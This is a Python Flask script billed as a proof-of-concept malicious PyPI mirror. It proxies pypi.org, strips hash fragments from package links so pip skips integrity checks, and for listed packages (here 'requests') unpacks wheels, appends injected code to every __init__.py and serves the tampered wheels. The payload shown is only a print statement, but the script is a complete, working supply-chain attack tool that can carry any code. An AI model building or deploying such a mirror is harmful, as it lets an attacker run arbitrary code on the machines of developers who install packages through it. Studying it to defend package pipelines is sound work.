#!/usr/bin/env python3
"""
PyPI Mirror with Package Modification (Hash Removal Version)

A proof-of-concept malicious PyPI mirror that demonstrates supply chain attacks
by intercepting and modifying Python packages while removing hash verification.

For informational and educational purposes only.
"""

from flask import Flask, Response, send_file, redirect
import os
import zipfile
import tempfile
import shutil
import requests
import logging
import re
from urllib.parse import urljoin, urlparse

app = Flask(__name__)

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler("proxy.log"), logging.StreamHandler()]
)
logger = logging.getLogger("fixed-proxy")

PYPI_URL = "https://pypi.org/simple"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CACHE_DIR = os.path.join(BASE_DIR, 'cache')
MODIFIED_DIR = os.path.join(BASE_DIR, 'modified')

os.makedirs(CACHE_DIR, exist_ok=True)
os.makedirs(MODIFIED_DIR, exist_ok=True)

MODIFICATION_CODE = '''
print("hello world")
'''

# Packages to modify
PACKAGES_TO_MODIFY = ["requests"]

metadata_url_cache = {}


@app.route('/')
def index():
    return redirect('/simple/')


@app.route('/simple/')
def simple_index():
    response = requests.get(PYPI_URL)
    return Response(response.content, status=response.status_code,
                    content_type=response.headers.get('Content-Type', 'text/html'))


@app.route('/simple/<package>/')
def package_index(package):
    logger.info(f"Package index requested for: {package}")
    response = requests.get(f"{PYPI_URL}/{package}/")
    html_content = response.text

    metadata_url_cache[package] = {}

    def rewrite_url(match):
        original_url = match.group(1)
        parsed_url = urlparse(original_url)
        filename = os.path.basename(parsed_url.path)
        
        # Note: Hash fragments are automatically removed by urlparse().path
        # This is intentional - pip works fine without hashes

        if filename.endswith('.metadata'):
            metadata_url_cache[package][filename] = urljoin(f"https://files.pythonhosted.org{parsed_url.path}", '')
        else:
            # Store both wheel URL and metadata URL explicitly and separately
            metadata_filename = filename + '.metadata'
            metadata_url_cache[package][filename] = urljoin(f"https://files.pythonhosted.org{parsed_url.path}", '')
            metadata_url_cache[package][metadata_filename] = urljoin(
                f"https://files.pythonhosted.org{parsed_url.path}.metadata", '')

        return f'href="/simple/{package}/{filename}"'

    html_content = re.sub(r'href="([^"]+)"', rewrite_url, html_content)

    return Response(html_content, status=200, content_type=response.headers.get('Content-Type', 'text/html'))


@app.route('/simple/<package>/<path:filename>')
def serve_package_file(package, filename):
    logger.info(f"Serving package file: {package}/{filename}")
    clean_filename = filename.split('?')[0]

    # Handle metadata files first
    if clean_filename.endswith('.metadata'):
        logger.info(f"Serving metadata for: {package}/{clean_filename[:-9]}")
        return serve_metadata(package, clean_filename[:-9])

    cache_path = os.path.join(CACHE_DIR, package, clean_filename)
    modified_path = os.path.join(MODIFIED_DIR, package, clean_filename)

    os.makedirs(os.path.dirname(cache_path), exist_ok=True)
    os.makedirs(os.path.dirname(modified_path), exist_ok=True)

    # For packages not in our modification list, bypass all modification logic
    if package not in PACKAGES_TO_MODIFY:
        logger.info(f"Package {package} not in modification list, serving directly")
        # Ensure we have the file in cache
        if not os.path.exists(cache_path):
            download_url = metadata_url_cache[package].get(clean_filename)
            if not download_url:
                logger.error(f"Package file not found in cache: {clean_filename}")
                return f"Package not found: {clean_filename}", 404

            logger.info(f"Downloading {download_url} to {cache_path}")
            with requests.get(download_url, stream=True) as r:
                r.raise_for_status()
                with open(cache_path, 'wb') as f:
                    for chunk in r.iter_content(8192):
                        f.write(chunk)

        logger.info(f"Serving unmodified file: {cache_path}")
        return send_file(cache_path)

    # For packages in our modification list, proceed with modification if needed
    if os.path.exists(modified_path):
        logger.info(f"Serving already modified file: {modified_path}")
        return send_file(modified_path)

    # Download the file if it's not already cached
    download_url = metadata_url_cache[package].get(clean_filename)
    if not download_url:
        logger.error(f"Package file not found: {clean_filename}")
        return f"Package not found: {clean_filename}", 404

    if not os.path.exists(cache_path):
        logger.info(f"Downloading {download_url} to {cache_path}")
        with requests.get(download_url, stream=True) as r:
            r.raise_for_status()
            with open(cache_path, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)

    # Only modify wheel files
    if clean_filename.endswith('.whl'):
        logger.info(f"Modifying wheel file: {cache_path}")
        temp_dir = tempfile.mkdtemp()
        try:
            with zipfile.ZipFile(cache_path) as zip_ref:
                zip_ref.extractall(temp_dir)

            modified = False

            # Only modify the main package files, not dependencies
            package_dir = None
            for name in os.listdir(temp_dir):
                if os.path.isdir(os.path.join(temp_dir, name)):
                    # Convert package name to directory name format (dashes to underscores)
                    normalized_name = package.replace('-', '_')
                    if name.lower() == normalized_name.lower():
                        package_dir = os.path.join(temp_dir, name)
                        break

            if package_dir and os.path.exists(package_dir):
                logger.info(f"Found package directory: {package_dir}")
                for root, _, files in os.walk(package_dir):
                    if '__init__.py' in files:
                        init_path = os.path.join(root, '__init__.py')
                        logger.info(f"Modifying __init__.py at: {init_path}")
                        with open(init_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()

                        # Add code to the end of the file to avoid import issues
                        with open(init_path, 'a', encoding='utf-8') as f:
                            f.write('\n\n' + MODIFICATION_CODE.strip() + '\n')

                        modified = True

            if modified:
                logger.info(f"Creating modified wheel: {modified_path}")
                with zipfile.ZipFile(modified_path, 'w') as zipf:
                    for root, _, files in os.walk(temp_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, temp_dir)
                            zipf.write(file_path, arcname)
                return send_file(modified_path)
        finally:
            shutil.rmtree(temp_dir)

    logger.info(f"Serving original file: {cache_path}")
    return send_file(cache_path)


@app.route('/simple/<package>/<path:filename>.metadata')
def serve_metadata(package, filename):
    logger.info(f"Metadata requested for: {package}/{filename}")
    metadata_url = metadata_url_cache[package].get(filename + '.metadata')

    if not metadata_url:
        logger.error(f"Metadata URL not found for: {package}/{filename}")
        return Response("Not Found", 404)

    response = requests.get(metadata_url)
    if response.status_code == 404:
        logger.error(f"Metadata not found at: {metadata_url}")
        return Response("Not Found", 404)

    # Return metadata as-is (no hash modifications)
    return Response(response.text, status=200, content_type=response.headers.get('Content-Type', 'text/plain'))


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
